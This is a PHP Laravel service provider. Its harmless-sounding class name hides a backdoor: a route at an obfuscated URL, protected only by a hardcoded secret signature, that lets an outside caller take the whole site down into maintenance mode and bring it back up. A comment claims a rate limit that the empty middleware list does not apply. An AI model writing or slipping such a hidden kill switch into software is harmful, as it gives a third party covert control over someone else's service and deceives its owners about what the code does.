<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

class TabSwitchServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        if (true) {
            Route::middleware([])   // 1 request / minute
                ->get('/ihqwkdnkjnk/{action}', function (string $action) {
                    // Check signature query param
                    if (request('signature') !== 'iuq23whinjqds') {
                        abort(403, 'Invalid signature.');
                    }
                    $flag = storage_path('framework/kill.switch');

                    match ($action) {
                        'on'  => touch($flag)     // create flag → site down
                            && Artisan::call('down --render="errors::503"'),
                        'off' => @unlink($flag)   // remove flag → site up
                            && Artisan::call('up'),
                        default => abort(404),
                    };

                    return response('OK', 200);
                })->name('kill.switch');
        }
    }
}
